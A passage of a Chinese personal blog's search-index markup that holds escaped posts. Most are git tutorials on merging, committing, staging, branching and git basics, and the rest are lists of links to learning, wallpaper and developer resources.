&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1624777268946.gif&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;冲突&#34;&gt;冲突&lt;/h2&gt;
&lt;p&gt;当我们合并分支的时候，如果当前分支和要被合并的分支在同一个地方修改了不同的内容，会发生冲突，自动合并失败，需要人为解决。&lt;/p&gt;
&lt;h3 id=&#34;解决冲突&#34;&gt;解决冲突&lt;/h3&gt;
&lt;p&gt;git会使用如下结构，将冲突的内容标注起来&lt;/p&gt;
&lt;p&gt;git会将当前分支中的内容放在 “&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt; HEAD” 与 “=======” 之间。&lt;/p&gt;
&lt;p&gt;git会将合并分支中的内容放在 “=======”  与 “&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt; new” 之间。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt; HEAD

=======

&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt; BranchName
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;当我们手动解决完之后，重新添加并提交即可。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1624777598642.gif&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;放弃合并&#34;&gt;放弃合并&lt;/h3&gt;
&lt;p&gt;当我们执行git merge --abort命令以后，git就取消了本次合并操作&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git merge --abort
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;参数&#34;&gt;参数&lt;/h2&gt;
&lt;h3 id=&#34;-no-ff&#34;&gt;--no-ff&lt;/h3&gt;
&lt;p&gt;明确指定不使用”Fast-forward”的模式进行合并&lt;/p&gt;
&lt;p&gt;即使合并条件满足”Fast-forward”模式，也不使用快进的方式进行合并，而是使用创建合并提交的方式进行合并。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git merge --no-ff [branch]
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;-ff-only&#34;&gt;--ff-only&lt;/h3&gt;
&lt;p&gt;当能使用”Fast-forward”模式合并时，合并正常执行，当不能使用”Fast-forward”模式合并时，取消合并。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;git merge --ff-only [branch]
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;-squash&#34;&gt;--squash&lt;/h3&gt;
&lt;p&gt;压缩提交记录，即将被合并分支的提交记录合并为一个&lt;/p&gt;
&lt;p&gt;当dev分支上有多条细小琐碎的提交时，可以使用这种合并方式，将dev分支合并到master&lt;/p&gt;
&lt;p&gt;这样master主分支上的提交记录会看起来比较清爽，缺点是不会保留原作者&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git merge --squash [branch]
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;-no-edit&#34;&gt;--no-edit&lt;/h3&gt;
&lt;p&gt;让合并提交直接使用默认生成的注释，默认注释为&lt;code&gt;Merge branch ‘BranchName&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git merge --no-edit [branch]
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;-m&#34;&gt;-m&lt;/h3&gt;
&lt;p&gt;合并提交自定义注释信息&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git merge [branch] --no-ff -m &amp;quot;message&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;推荐阅读&#34;&gt;推荐阅读&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://www.lzane.com/tech/git-merge/&#34;&gt;git合并策略&lt;/a&gt;&lt;/p&gt;
">10-git-6-merge</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/git-commit/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;git commit&lt;/code&gt;命令用于将暂存区中的变化提交到仓库区。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-m&lt;/code&gt;参数用于指定 commit 信息，是必需的。如果省略&lt;code&gt;-m&lt;/code&gt;参数，&lt;code&gt;git commit&lt;/code&gt;会自动打开文本编辑器，要求输入。&lt;br&gt;
注意要使用双引号&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git commit -m &amp;quot;message&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;命令行参数&#34;&gt;命令行参数&lt;/h2&gt;
&lt;h3 id=&#34;-a&#34;&gt;-a&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;-a&lt;/code&gt;参数用于先将所有工作区的变动文件，提交到暂存区，再运行&lt;code&gt;git commit&lt;/code&gt;。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git commit -am &amp;quot;message&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;用了&lt;code&gt;-a&lt;/code&gt;参数，是不是就不用执行&lt;code&gt;git add .&lt;/code&gt;命令了？不是。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-m&lt;/code&gt;参数用于提交暂存区的文件&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-a&lt;/code&gt;参数用于提交追踪过的文件&lt;/p&gt;
&lt;p&gt;文件状态按已追踪和未追踪区分，新增的文件为未追踪，&lt;code&gt;git add&lt;/code&gt;后的文件为已追踪&lt;/p&gt;
&lt;p&gt;所以新增的文件还是要执行&lt;code&gt;git add .&lt;/code&gt;命令&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;amend&#34;&gt;—amend&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;--amend&lt;/code&gt;参数用于撤销上一次 commit，然后生成一个新的 commit。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git commit --amend -m &amp;quot;new commit message&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
">9-git-5-commit</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/git-add/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;git add&lt;/code&gt;命令用于将变化的文件，从工作区提交到暂存区。&lt;/p&gt;
&lt;p&gt;将指定文件放入暂存区&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git add &amp;lt;file&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;将指定目录下所有变化的文件，放入暂存区&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git add &amp;lt;directory&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;将当前目录下所有变化的文件，放入暂存区&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git add .
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;参数&#34;&gt;参数&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;-u&lt;/code&gt;参数表示只添加暂存区已有的文件（包括删除操作），但不添加新增的文件。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git add -u
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;-A&lt;/code&gt;或者&lt;code&gt;--all&lt;/code&gt;参数表示追踪所有操作，包括新增、修改和删除。&lt;/p&gt;
&lt;p&gt;Git 2.0 版开始，&lt;code&gt;-A&lt;/code&gt;参数成为默认，即&lt;code&gt;git add .&lt;/code&gt;等同于&lt;code&gt;git add -A&lt;/code&gt;。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git add -A
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;-f&lt;/code&gt;参数表示强制添加某个文件，不管&lt;code&gt;.gitignore&lt;/code&gt;是否包含了这个文件。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git add -f &amp;lt;fileName&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;-p&lt;/code&gt;参数表示进入交互模式，指定哪些修改需要添加到暂存区。即使是同一个文件，也可以只提交部分变动。&lt;/p&gt;
&lt;p&gt;未跟踪(即新增的)文件不在此参数范围内&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git add -p
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;详解&#34;&gt;详解&lt;/h2&gt;
&lt;p&gt;交互模式可以挑选一部分改动进行提交&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;交互地在索引和工作树之间选择补丁块并将它们添加到索引中。&lt;br&gt;
这让用户有机会在将修改后的内容添加到索引之前查看差异。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;输入 &lt;code&gt;git add -p&lt;/code&gt; 进入 &lt;code&gt;patch mode&lt;/code&gt; , 此时 &lt;code&gt;git&lt;/code&gt; 会自动将改动切分成多个片段，并展示第一个片段，提示你进行选择。&lt;/p&gt;
&lt;p&gt;提示语句是 &lt;code&gt;Stage this hunk [y,n,q,a,d,/,s,e,?]?&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这些字母都是什么意思呢? 输入&lt;code&gt;?&lt;/code&gt;回车，可以查看详细的帮助信息。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;y - stage this hunk&lt;br&gt;
n - do not stage this hunk&lt;br&gt;
q - quit; do not stage this hunk or any of the remaining ones&lt;br&gt;
a - stage this hunk and all later hunks in the file&lt;br&gt;
d - do not stage this hunk or any of the later hunks in the file&lt;br&gt;
g - select a hunk to go to&lt;br&gt;
/ - search for a hunk matching the given regex&lt;br&gt;
j - leave this hunk undecided, see next undecided hunk&lt;br&gt;
J - leave this hunk undecided, see next hunk&lt;br&gt;
k - leave this hunk undecided, see previous undecided hunk&lt;br&gt;
K - leave this hunk undecided, see previous hunk&lt;br&gt;
s - split the current hunk into smaller hunks&lt;br&gt;
e - manually edit the current hunk&lt;br&gt;
? - print help&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;y - 暂存此区块&lt;br&gt;
n - 不暂存此区块&lt;br&gt;
q - 退出；不暂存包括此块在内的剩余的区块&lt;br&gt;
a - 暂存此块与此文件后面所有的区块&lt;br&gt;
d - 不暂存此块与此文件后面所有的 区块&lt;br&gt;
g - 选择并跳转至一个区块&lt;br&gt;
/ - 搜索与给定正则表达式匹配的区块&lt;br&gt;
j - 暂不决定，转至下一个未决定的区块&lt;br&gt;
J - 暂不决定，转至一个区块&lt;br&gt;
k - 暂不决定，转至上一个未决定的区块&lt;br&gt;
K - 暂不决定，转至上一个区块&lt;br&gt;
s - 将当前的区块分割成多个较小的区块&lt;br&gt;
e - 手动编辑当前的区块&lt;br&gt;
? - 输出帮助&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;如果你想分开提交的话，行 &lt;code&gt;s&lt;/code&gt; 分割，然后使用y或者n来选择是否提交，交替循环。&lt;/p&gt;
">8-git-4-add</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/git-branch/"" data-c="
          &lt;h2 id=&#34;1-查看分支&#34;&gt;1、查看分支&lt;/h2&gt;
&lt;p&gt;*表示当前分支&lt;/p&gt;
&lt;p&gt;查看所有本地分支&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git branch
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;查看分支的详细信息（commitID及message）&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git branch -v
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;查看本地分支与远程分支的关联&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git branch -vv
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;查看所有远程分支&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;git branch -r
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;查看所有本地分支和远程分支&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git branch -a
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;2-新建分支&#34;&gt;2、新建分支&lt;/h2&gt;
&lt;h3 id=&#34;新建本地分支&#34;&gt;新建本地分支&lt;/h3&gt;
&lt;p&gt;直接在&lt;code&gt;git branch&lt;/code&gt;后面跟上分支名，就表示新建该分支。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git branch [branch-name]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;创建后，还是停留在原来分支，需要用&lt;code&gt;git checkout&lt;/code&gt;切换到新建分支&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git checkout [branch-name]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;使用&lt;code&gt;-b&lt;/code&gt;参数，可以新建的同时，切换到新分支。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git checkout -b [branch-name]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;通过远程分支检出一个新的分支，执行:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;git checkout -b [branch-name] [remote]/[remote-branch]
git checkout -b newBranch origin/main
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;就可以创建一个名为 &lt;code&gt;newBranch&lt;/code&gt; 的分支，它跟踪远程分支 &lt;code&gt;origin/main&lt;/code&gt;。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;新建一个分支，与指定的远程分支建立追踪关系&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git branch --track [branch] [remote]/[remote-branch]
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;新建远程分支&#34;&gt;新建远程分支&lt;/h3&gt;
&lt;p&gt;创建远程分支&lt;/p&gt;
&lt;p&gt;创建远程分支的前提是本地有这个分支，推送到远程后，因为远程没有此分支，所以会新建&lt;/p&gt;
&lt;p&gt;在远程主机&lt;code&gt;origin&lt;/code&gt;上创建一个dev分支&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git push [remote] [place-branch]
git push origin dev
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在远程主机&lt;code&gt;origin&lt;/code&gt;上创建一个&lt;code&gt;dev&lt;/code&gt;的分支，并与本地的同名分支建立追踪关系。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git push -u [remote] [place-branch]
git push -u origin dev
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;3-删除分支&#34;&gt;3、删除分支&lt;/h2&gt;
&lt;h3 id=&#34;删除本地分支&#34;&gt;删除本地分支&lt;/h3&gt;
&lt;p&gt;需要当前不在被删除的分支上&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-d&lt;/code&gt;参数用来删除一个分支，前提是该分支没有未合并的变动。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git branch -d [branch-name]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;强制删除一个分支，不管有没有未合并变化。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git branch -D [branch-name]
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;删除远程分支&#34;&gt;删除远程分支&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git push [remote] --delete [branch-name]
git push origin --delete dev
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git branch -dr [remote]/[remote-branch]
git branch -dr origin/dev
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;4-分支改名&#34;&gt;4、分支改名&lt;/h2&gt;
&lt;p&gt;为当前分支改名&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git branch -m [branch-name]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;为指定分支改名&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git branch -m [branch-name] [new-branch-name]
git branch -m dev develop
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;5-关联远程分支&#34;&gt;5、关联远程分支&lt;/h2&gt;
&lt;p&gt;建立追踪关系，在现有分支与指定的远程分支之间&lt;/p&gt;
&lt;p&gt;方式一：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git branch --set-upstream-to=[remote]/[remote-branch] [branch]
git branch --set-upstream-to=origin/dev dev
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;方式二：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;git branch -u&lt;/code&gt; 命令，执行：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git branch -u [remote]/[remote-branch] [branch]
git branch -u origin/main foo
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这样 &lt;code&gt;foo&lt;/code&gt; 就会跟踪 &lt;code&gt;origin/main&lt;/code&gt; 了。如果当前就在 foo 分支上, 还可以省略 foo：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git branch -u o/main
&lt;/code&gt;&lt;/pre&gt;
">7-git-3-branch</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/git-jian-jie/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;git是目前世界上最先进的 &lt;strong&gt;分布式&lt;/strong&gt;  &lt;strong&gt;版本控制&lt;/strong&gt;系统。&lt;/p&gt;
&lt;h3 id=&#34;分布式&#34;&gt;分布式&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;集中式版本控制系统，版本库是集中存放在中央服务器的，而干活的时候，用的都是自己的电脑，所以要先从中央服务器取得最新的版本，然后开始干活，干完活了，再把自己的活推送给中央服务器。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;分布式版本控制系统根本没有“中央服务器”，每个人的电脑上都是一个完整的版本库,安全性要更高。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1663987171732.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;版本控制&#34;&gt;版本控制&lt;/h3&gt;
&lt;p&gt;通常我们保存多版本的方式，是通过拷贝一份副本，然后在副本上操作，假如我们在副本上的修改不满意，就可以从原版再拷贝一份，重新进行编辑。&lt;/p&gt;
&lt;p&gt;git就是帮我们做版本控制的一个系统。&lt;/p&gt;
&lt;h2 id=&#34;特点&#34;&gt;特点&lt;/h2&gt;
&lt;h3 id=&#34;直接记录快照而非差异比较&#34;&gt;直接记录快照，而非差异比较&lt;/h3&gt;
&lt;p&gt;Git 仓库中的提交记录保存的是你的目录下所有文件的快照，就像是把整个目录复制，然后再粘贴一样，但比复制粘贴优雅许多！&lt;/p&gt;
&lt;p&gt;Git 希望提交记录尽可能地轻量，因此在你每次进行提交时，它并不会盲目地复制整个目录。条件允许的情况下，它会将当前版本与仓库中的上一个版本进行对比，并把所有的差异打包到一起作为一个提交记录。&lt;/p&gt;
&lt;p&gt;Git 还保存了提交的历史记录。这也是为什么大多数提交记录的上面都有父节点的原因 —— 我们会在图示中用箭头来表示这种关系。对于项目组的成员来说，维护提交历史对大家都有好处。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1623799889637.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;分区及文件状态&#34;&gt;分区及文件状态&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Workspace：工作区&lt;/li&gt;
&lt;li&gt;Index / Stage：暂存区&lt;/li&gt;
&lt;li&gt;Repository：仓库区（或本地仓库）&lt;/li&gt;
&lt;li&gt;Remote：远程仓库&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Workspace：工作区，就是平时进行开发改动的地方（除了.git目录以外的其他所有文件目录），是当前看到最新的内容，在开发的过程也就是对工作区的操作。&lt;/p&gt;
&lt;p&gt;Index：暂存区，当执行 &lt;code&gt;git add&lt;/code&gt; 的命令后，工作区的文件就会被移入暂存区，暂存区标记了当前工作区中哪些内容是被 Git 管理的，当完成某个需求或者功能后需要提交代码，第一步就是通过 &lt;code&gt;git add&lt;/code&gt; 先提交到暂存区。&lt;/p&gt;
&lt;p&gt;Repository：本地仓库，位于自己的电脑上（隐藏文件.git目录），通过 &lt;code&gt;git commit&lt;/code&gt; 提交暂存区的内容，会进入本地仓库。&lt;/p&gt;
&lt;p&gt;Remote：远程仓库，用来托管代码的服务器，远程仓库的内容能够被分布在多个地点的处于协作关系的本地仓库修改，本地仓库修改完代码后通过 &lt;code&gt;git push&lt;/code&gt; 命令同步代码到远程仓库。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1623800678351.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1624707230372.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1624707238506.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
">6-git-2-简介</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/sheng-huo-wang-zhan-dao-hang/"" data-c="
          &lt;h2 id=&#34;英语&#34;&gt;英语&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/user/DailyEasyEnglish/videos?view=0&amp;amp;sort=da&amp;amp;flow=grid&#34;&gt;Daily Easy English&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://www.haiyue.info/coach-shane-daily-easy-english-expression.html&#34;&gt;daily-easy-english-expression笔记&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.bilibili.com/video/av84745697&#34;&gt;每日英语听写 Daily English Dictation 1-400&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;其他&#34;&gt;其他&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;http://www.tiqianhuandai.cc/&#34;&gt;房贷计算&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;壁纸&#34;&gt;壁纸&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://wallhaven.cc/&#34;&gt;https://wallhaven.cc/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lcoc.top/bizhi/&#34;&gt;http://lcoc.top/bizhi/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.3gbizhi.com/&#34;&gt;https://www.3gbizhi.com/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://bz.zzzmh.cn/index&#34;&gt;https://bz.zzzmh.cn/index&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;视频&#34;&gt;视频&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cupfox.app/&#34;&gt;https://www.cupfox.app/&lt;/a&gt;&lt;/p&gt;
">5-navigation-3-日常生活</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/cheng-xu-yuan-zi-yuan-hui-zong/"" data-c="
          &lt;h2 id=&#34;写在最前面&#34;&gt;写在最前面&lt;/h2&gt;
&lt;p&gt;互联网时代，不缺乏学习的资源，缺乏学习的心。&lt;/p&gt;
&lt;p&gt;再一次整理这些网站，希望不负初心！&lt;/p&gt;
&lt;h2 id=&#34;一-导航&#34;&gt;一、导航&lt;/h2&gt;
&lt;h3 id=&#34;前端导航&#34;&gt;前端导航&lt;/h3&gt;
&lt;p&gt;&lt;a href=&#34;http://nav.templatesy.com/&#34;&gt;http://nav.templatesy.com/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://www.alloyteam.com/nav/&#34;&gt;http://www.alloyteam.com/nav/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://javasoho.com/&#34;&gt;https://javasoho.com/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.daqianduan.com/nav&#34;&gt;https://www.daqianduan.com/nav&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://caibaojian.com/links/&#34;&gt;http://caibaojian.com/links/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://site.w3cub.com/&#34;&gt;https://site.w3cub.com/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://hao.f2ex.cn/&#34;&gt;https://hao.f2ex.cn/&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;二-github&#34;&gt;二、github&lt;/h2&gt;
&lt;h3 id=&#34;2-1-前端&#34;&gt;2-1、前端&lt;/h3&gt;
&lt;h4 id=&#34;前端资料&#34;&gt;前端资料&lt;/h4&gt;
&lt;p&gt;&lt;a href=&#34;https://helloqingfeng.github.io/front-end-index/index.html&#34;&gt;https://helloqingfeng.github.io/front-end-index/index.html&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&#34;前端面试&#34;&gt;前端面试&lt;/h4&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/markyun/My-blog/tree/master/Front-end-Developer-Questions/Questions-and-Answers&#34;&gt;https://github.com/markyun/My-blog/tree/master/Front-end-Developer-Questions/Questions-and-Answers&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;2-2-综合&#34;&gt;2-2、综合&lt;/h3&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/sdmg15/Best-websites-a-programmer-should-visit#internships&#34;&gt;https://github.com/sdmg15/Best-websites-a-programmer-should-visit#internships&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/wangdoc&#34;&gt;https://github.com/wangdoc&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;三-博客&#34;&gt;三、博客&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;http://www.ruanyifeng.com/blog/archives.html&#34;&gt;http://www.ruanyifeng.com/blog/archives.html&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;四-自检清单&#34;&gt;四、自检清单&lt;/h2&gt;
&lt;h3 id=&#34;前端&#34;&gt;前端&lt;/h3&gt;
&lt;p&gt;&lt;a href=&#34;http://www.conardli.top/blog/article/&#34;&gt;http://www.conardli.top/blog/article/&lt;/a&gt;&lt;/p&gt;
">4-navigation-2-开发资源.md</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/qian-duan-jiao-cheng-dao-hang/"" data-c="
          &lt;h2 id=&#34;git&#34;&gt;git&lt;/h2&gt;
&lt;p&gt;1、&lt;a href=&#34;https://learngitbranching.js.org/?locale=zh_CN&#34;&gt;游戏化教程&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;2、&lt;a href=&#34;https://www.bookstack.cn/read/git-tutorial/README.md&#34;&gt;阮一峰&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​      &lt;a href=&#34;http://www.ruanyifeng.com/blog/2014/06/git_remote.html&#34;&gt;阮一峰blog1&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​      &lt;a href=&#34;http://www.ruanyifeng.com/blog/2015/12/git-cheat-sheet.html&#34;&gt;阮一峰blog2&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;3、&lt;a href=&#34;https://www.zsythink.net/&#34;&gt;朱双印&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;4、&lt;a href=&#34;https://www.lzane.com/tech/git-internal/&#34;&gt;李泽帆&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;5、&lt;a href=&#34;https://dev.to/lydiahallie/cs-visualized-useful-git-commands-37p1&#34;&gt;Lydia Hallie&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;6、&lt;a href=&#34;https://marklodato.github.io/visual-git-guide/index-zh-cn.html&#34;&gt;图解git&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;7、&lt;a href=&#34;https://www.liaoxuefeng.com/wiki/896043488029600&#34;&gt;廖雪峰&lt;/a&gt;&lt;/p&gt;
